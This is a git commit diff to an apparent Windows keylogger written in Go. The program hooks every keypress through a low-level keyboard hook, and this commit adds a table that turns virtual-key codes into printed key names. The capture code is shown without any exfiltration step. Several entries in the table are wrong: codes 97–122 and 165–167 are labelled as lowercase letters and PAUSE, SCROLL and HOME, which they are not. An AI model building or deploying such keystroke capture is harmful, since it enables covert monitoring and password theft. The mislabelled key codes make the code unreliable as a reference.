a001c575ee0f5149214b473149180ce7097a8814
script kiddie <anish.chittu2007@gmail.com>
2024-09-08 23:08:15 +0200

    mapped key codes to keys

--- main.go
+++ main.go
@@ -19,6 +19,85 @@ var (
 	hook HHOOK
 )
 
+var asciiMap = map[int]string{
+	32:  "Space",
+	8: "BSPACE",
+	48:  "0",
+	49:  "1",
+	50:  "2",
+	51:  "3",
+	52:  "4",
+	53:  "5",
+	54:  "6",
+	55:  "7",
+	56:  "8",
+	57:  "9",
+	65:  "A",
+	66:  "B",
+	67:  "C",
+	68:  "D",
+	69:  "E",
+	70:  "F",
+	71:  "G",
+	72:  "H",
+	73:  "I",
+	74:  "J",
+	75:  "K",
+	76:  "L",
+	77:  "M",
+	78:  "N",
+	79:  "O",
+	80:  "P",
+	81:  "Q",
+	82:  "R",
+	83:  "S",
+	84:  "T",
+	85:  "U",
+	86:  "V",
+	87:  "W",
+	88:  "X",
+	89:  "Y",
+	90:  "Z",
+	97:  "a",
+	98:  "b",
+	99:  "c",
+	100: "d",
+	101: "e",
+	102: "f",
+	103: "g",
+	104: "h",
+	105: "i",
+	106: "j",
+	107: "k",
+	108: "l",
+	109: "m",
+	110: "n",
+	111: "o",
+	112: "p",
+	113: "q",
+	114: "r",
+	115: "s",
+	116: "t",
+	117: "u",
+	118: "v",
+	119: "w",
+	120: "x",
+	121: "y",
+	122: "z",
+	13: "Enter",
+	27: "ESC",
+	160: "LSHIFT",
+	161: "RSHIFT",
+	20: "Caps lock",
+	162: "LCTRL",
+	163: "RCTRL",
+    165: "PAUSE",
+    166: "SCROLL",
+    167: "HOME",
+	91: "WIN",
+	9: "TAB",
+}
+
 type HHOOK uintptr
 type WPARAM uintptr
 type LPARAM uintptr
@@ -82,8 +161,13 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
 		if wParam == WM_KEYDOWN {
 			vkCode := kbdStruct.VkCode
-			// Handle key press event (e.g., logging, remapping, etc.)
-			fmt.Printf("Key pressed: %d\n", vkCode)
+			
+			value, exists := asciiMap[int(vkCode)]
+			if exists {
+                fmt.Printf("Keydown: %s (0x%04X)\n", value, vkCode)
+            } else {
+                fmt.Printf("Keydown: Unknown (%d)\n", vkCode)
+            }
 		}
 	}
 	return CallNextHookEx(hook, nCode, wParam, lParam)
